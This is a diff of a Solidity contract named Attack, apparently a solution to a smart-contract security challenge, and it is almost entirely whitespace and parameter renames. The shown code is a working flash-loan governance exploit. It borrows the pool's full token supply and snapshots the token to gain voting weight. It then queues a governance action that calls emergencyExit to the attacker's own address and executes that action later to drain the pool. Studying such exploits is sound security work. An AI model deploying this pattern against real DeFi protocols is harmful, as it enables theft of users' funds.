@@ -23,15 +23,22 @@ contract Attack{
     }
 
     function attack1()external{
+
         pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), INITIAL_SUPPLY_POOL, abi.encodeWithSignature("emergencyExit(address)", address(this)));
+    
     }
     function attack2()external{
+
         governance.executeAction(actionID);
+    
     }
-    function onFlashLoan(address smth,address _token, uint256 value, uint256 zero, bytes memory data )external returns(bytes32){
+
+    function onFlashLoan(address _address,address _token, uint256 _value, uint256 zero, bytes memory data)external returns(bytes32){
+        
         token.snapshot();
-        token.approve(address(pool), value);
-        actionID= governance.queueAction(address(pool), uint128(zero), data );
+        token.approve(address(pool), _value);
+
+        actionID= governance.queueAction(address(pool), uint128(zero), data);
 
         return CALLBACK_SUCCESS;
     }
